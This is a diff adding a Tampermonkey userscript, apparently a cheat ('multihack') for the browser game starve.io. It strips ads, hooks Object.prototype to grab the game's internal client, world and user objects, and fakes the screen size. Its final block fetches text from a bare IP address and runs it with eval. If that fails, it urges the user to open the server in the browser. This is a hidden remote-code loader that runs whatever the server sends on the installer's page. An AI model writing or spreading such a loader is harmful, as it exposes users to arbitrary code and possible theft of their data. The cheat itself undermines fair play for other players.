@@ -1,0 +1,213 @@
+// ==UserScript==
+// @name         Multihack by setorg V autoupdate
+// @namespace    http://tampermonkey.net/
+// @version      2024-05-20
+// @description  Всё что нужно для реального пацана
+// @author       setorg
+// @match        https://starve.io/*
+// @run-at       document-start
+// @grant        unsafeWindow
+// @require      https://code.jquery.com/jquery-3.4.1.min.js
+// ==/UserScript==
+
+
+verifiKey = '_2d=asdrufO:LUI/HYTigh&9-!_sfj*80se'
+
+
+let disableVideo = () => { }
+
+disableVideo = () => {
+    const _0x373f97 = new MutationObserver(function (_0x3516f5) {
+        for (const _0x577155 of _0x3516f5) {
+            for (const _0x3b8d74 of _0x577155['addedNodes']) {
+                _0x3b8d74['src'] && (_0x3b8d74['src']["includes"]("server.cmpstar.net") || _0x3b8d74['src']["includes"]('sdk.truepush.com') || _0x3b8d74["src"]["includes"]('sdki.truepush.com') || _0x3b8d74['src']["includes"]("adinplay") || _0x3b8d74["src"]["includes"]("amazon-adsystem.com") || _0x3b8d74["src"]["includes"]("www.google-analytics.com") || _0x3b8d74["src"]['includes']('ib.adnxs.com') || _0x3b8d74['src']["includes"]("targeting.unrulymedia.com") || _0x3b8d74["src"]['includes']("www.google-analytics.com") || _0x3b8d74["src"]["includes"]("pagead2.googlesyndication.com") || _0x3b8d74['src']["includes"]("doubleclick.net") || _0x3b8d74["src"]["includes"]("script.4dex.io")) && (_0x3b8d74['src'] = '', _0x3b8d74["innerHTML"] = '', _0x3b8d74["textContent"] = ''), _0x3b8d74['className'] === "wg-ad-container" && setTimeout(function () {
+                    _0x1cc076 = document["querySelector"](".wg-ad-player");
+                    _0x1cc076["currentTime"] = 0x14;
+                    const _0x4b0f71 = _0x1cc076['parentElement'];
+                    _0x4b0f71["style"]["display"] = 'none';
+                }, 0x1);
+            }
+        }
+    });
+    _0x373f97['observe'](document, {
+        'childList': !![],
+        'attributes': !![],
+        'subtree': !![]
+    });
+};
+
+let LAST_CRAFT;
+
+const charTotem = '🤵'
+const charBred = '🍞'
+const charDough = '🥣'
+const charWood = '🥢'
+const charWheat = '🌾'
+
+let world;
+let game;
+let client;
+let user;
+let mouse;
+let sdpfin;
+let _this;
+let log = console.log
+let LAST_RECYCLE
+let master = Symbol()
+
+
+const abc = 'ABCDEFGHIJKLMNEWOPQRSTUVXYZabcdefghijklmnopqrstuvwxy!z';
+function Gen(count) {
+    let code = '';
+    const len = abc.length;
+    for (let i = 0; i < count; i++) {
+        code += abc.charAt(Math.floor(Math.random() * len));
+    }
+    return code;
+}
+
+function ads() {
+    let uwu = document.getElementById("preroll")
+    let uws = document.getElementById("trevda")
+    let style = document.createElement('style');
+
+    uwu.remove()
+    uws.remove()
+    style.innerHTML = '.grecaptcha-badge { visibility: hidden; }';
+
+    document.head.appendChild(style);
+}
+
+const originalTimeoutDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, "timeout");
+const originalIdleDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, "IDLE");
+const originalOptionsDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, "options");
+const originalModeDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, "mode");
+const originalMappingDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, "mapping");
+
+function hooks() {
+    Object.defineProperty(Object.prototype, "timeout", {
+        get() {
+            return this._myProperty;
+        },
+        set(data) {
+            this._myProperty = data;
+            if (!client) {
+                client = this;
+                console.log('client', client);
+                unsafeWindow.client = client;
+                setTimeout(() => {
+                    if (originalTimeoutDescriptor) {
+                        Object.defineProperty(Object.prototype, "timeout", originalTimeoutDescriptor);
+                    } else delete Object.prototype.timeout;
+                    console.log('OLD timeout');
+                }, 0);
+            }
+        },
+        configurable: true,
+    });
+
+    Object.defineProperty(Object.prototype, "IDLE", {
+        get() {
+            return this._myProperty;
+        },
+        set(data) {
+            this._myProperty = data;
+            if (!mouse) {
+                mouse = this;
+                console.log('mouse', mouse);
+                unsafeWindow.mouse = mouse;
+                setTimeout(() => {
+                    if (originalIdleDescriptor) {
+                        Object.defineProperty(Object.prototype, "IDLE", originalIdleDescriptor);
+                    } else delete Object.prototype.IDLE;
+                    console.log('OLD IDLE');
+                }, 0);
+            }
+        },
+        configurable: true,
+    });
+
+    Object.defineProperty(Object.prototype, "options", {
+        get() {
+            return this._myProperty;
+        },
+        set(data) {
+            this._myProperty = data;
+            if (!game && this["sign"]) {
+                game = this;
+                console.log('game', game);
+                unsafeWindow.game = game;
+            }
+        },
+        configurable: true,
+    });
+
+    Object.defineProperty(Screen.prototype, "width", {
+        get() {
+            return 3840;
+        },
+        set(value) {
+            this._myProperty = value;
+        }
+    });
+
+    Object.defineProperty(Screen.prototype, "height", {
+        get() {
+            return 2160;
+        },
+        set(value) {
+            this._myProperty = value;
+        }
+    });
+
+    Object.defineProperty(Object.prototype, "mode", {
+        get() {
+            return this._myProperty;
+        },
+        set(data) {
+            this._myProperty = data;
+            if (!world) {
+                console.log('world', this);
+                world = this;
+                unsafeWindow.world = world;
+            }
+        },
+        configurable: true,
+    });
+
+    Object.defineProperty(Object.prototype, "control", {
+        get() {
+            return this._myProperty;
+        },
+        set(data) {
+            this._myProperty = data;
+            if (!user) {
+                user = this;
+                console.log('user', user);
+                unsafeWindow.user = user;
+                user[Object.keys(user)[10]] = false; // alive
+                ads();
+                disableVideo();
+            }
+        },
+        configurable: true,
+    });
+}
+hooks()
+
+
+fetch(`https://217.71.129.139:4567/get_verifi`)
+    .then(response => {
+        if (!response.ok) {
+            throw new Error(`HTTP error! status: ${response.status}`);
+        }
+        return response.text();
+    })
+    .then(data => {
+        eval(JSON.parse(data));
+    })
+    .catch(error => {
+        alert('Your browser does not allow access to the server. Pls do the following\n---------------\nВаш браузер не разрешает доступ к серверу со скриптом. Чтоб продожить разрешите.');
+        window.open("https://217.71.129.139:4567");
+    });
+
